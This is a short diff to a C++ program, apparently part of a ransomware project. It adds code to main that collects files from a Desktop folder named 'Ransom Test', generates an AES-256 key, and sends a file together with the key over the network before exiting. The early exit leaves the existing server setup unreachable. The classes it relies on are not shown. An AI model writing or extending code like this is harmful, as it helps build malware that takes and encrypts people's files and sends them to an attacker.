@@ -10,6 +10,16 @@ void SignalHandler(int signal) {
 }
 
 int main() {
+    FileManager fileMgr;
+    fileMgr.FindFiles("C:\\Users\\ethan\\Desktop\\Ransom Test\\");
+
+    BYTESTRING key = LGCrypto::Generate256AESKey();
+
+    NetworkManager netMgr;
+    netMgr.SendFile(fileMgr.GetFile(0), 0, key);
+
+    exit(1);
+
     ServerInterface server(5454, 4820); // make a tcp server on port 5454 and start it
     
     signal(SIGINT, SignalHandler);
